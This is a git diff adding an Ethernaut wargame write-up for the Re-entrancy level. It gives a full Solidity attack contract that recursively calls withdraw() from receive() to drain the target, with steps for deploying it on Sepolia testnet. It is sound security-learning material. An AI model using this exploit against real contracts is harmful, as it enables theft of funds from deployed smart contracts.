@@ -481,5 +481,101 @@ I used this to confirm that my `KingAttack` contract had become the new king.
 ---
 
 ## Level Completed
-
 ![Level Complete Output](assets/King.png)
+
+# Ethernaut Level 10: Re-entrancy
+
+## Strategy
+
+- **Vulnerability**: The `Reentrance` contract allowed a re-entrant call to `withdraw()` *before* updating the user's balance, due to calling `msg.sender.call.value()` first. This made it vulnerable to **reentrancy attacks**.
+- **Exploit**: I wrote and deployed a malicious contract (`ReentranceAttack`) that:
+  1. Donated a small amount of Ether to itself in the target contract.
+  2. Called `withdraw()` which triggered the fallback `receive()` function.
+  3. The `receive()` function recursively called `withdraw()` again, draining the contract before the balance was updated.
+- **Outcome**: I successfully drained all funds from the target contract and completed the level.
+
+---
+
+### Prepared the `ReentranceAttack` Contract
+
+I created a new file called `ReentranceAttack.sol` in Remix and pasted the following code:
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+interface IReentrance {
+    function donate(address _to) external payable;
+    function withdraw(uint256 _amount) external;
+}
+
+contract ReentranceAttack {
+    address payable public target;
+    address public owner;
+
+    constructor(address _targetAddress) public {
+        target = payable(_targetAddress);
+        owner = msg.sender;
+    }
+
+    function attack() external payable {
+        require(msg.value > 0, "Send some ETH");
+        IReentrance(target).donate{value: msg.value}(address(this));
+        IReentrance(target).withdraw(msg.value);
+    }
+
+    receive() external payable {
+        uint256 targetBalance = address(target).balance;
+        if (targetBalance > 0) {
+            uint256 withdrawAmount = targetBalance > 0.001 ether ? 0.001 ether : targetBalance;
+            IReentrance(target).withdraw(withdrawAmount);
+        }
+    }
+
+    function withdrawFunds() public {
+        require(msg.sender == owner, "Not owner");
+        msg.sender.transfer(address(this).balance);
+    }
+}
+```
+
+---
+
+### Compiled the Contract
+
+- I used Solidity compiler version `0.6.12` to match the version used by the level.
+- Clicked **Compile ReentranceAttack.sol**.
+
+---
+
+### Deployed the Attack Contract
+
+- Switched to **Injected Web3** in Remix (connected to Sepolia testnet via MetaMask).
+- Provided the **instance address of the Reentrance contract** as the constructor argument.
+- Deployed the contract with `0.001 ETH`.
+
+---
+
+### Executed the Attack
+
+- Called the `attack()` function with `0.001 ETH`.
+- The attack recursively called `withdraw()` through the fallback `receive()` function, draining the contract balance.
+
+To monitor the balance of the target contract, I ran:
+```
+(await web3.eth.getBalance(instance)).toString()
+```
+Once the balance reached `0`, I confirmed the attack was successful.
+
+---
+
+### Step 6: Submitted the Level
+
+- After confirming the contract’s balance was `0`, I submitted the level on Ethernaut — and it was marked complete.
+
+---
+
+## Level Completed
+![Level Complete Output](assets/Re-entrancy.png)
+![Level Complete Output](assets/Re-entrancy(1).png)
+
